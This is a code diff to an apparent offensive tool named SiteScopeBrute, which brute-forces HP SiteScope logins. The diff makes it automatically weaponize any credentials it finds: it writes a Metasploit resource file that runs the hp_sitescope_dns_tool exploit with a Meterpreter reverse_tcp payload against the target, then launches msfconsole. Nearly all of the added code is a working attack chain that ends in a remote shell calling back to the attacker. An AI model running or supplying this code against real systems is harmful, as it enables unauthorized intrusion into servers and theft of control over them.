@@ -5,6 +5,8 @@ from requests import session
 import requests
 import re
 from argparse import ArgumentParser
+import os
+import socket
 
 class SiteScopeBrute():
     def connectTest(self, config, payload):
@@ -19,7 +21,24 @@ class SiteScopeBrute():
             if m:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
             else:
-                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Now go run the SiteScope Metasploit Module! :-)")
+                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"] + ". Running Metasploit module now...")
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("gmail.com",80))
+                locIP = s.getsockname()[0]
+                s.close()
+                msfrf = open('msfresource.rc', 'w')
+                msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
+                msfrf.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
+                msfrf.write('set RHOST ' + config["HOST"] + '\n')
+                msfrf.write('set RPORT ' + config["port"] + '\n')
+                msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
+                msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
+                msfrf.write('set LHOST ' + locIP + '\n')
+                msfrf.write('set ExitOnSession false\n')
+                msfrf.write('exploit -j -z\n')
+                msfrf.close()
+                os.system("msfconsole -r msfresource.rc")
+                os.system("rm msfresource.rc")
     def payload(self, config):
         if config["UserFile"]:
             lines = [line.rstrip('\n') for line in open(config["UserFile"])]
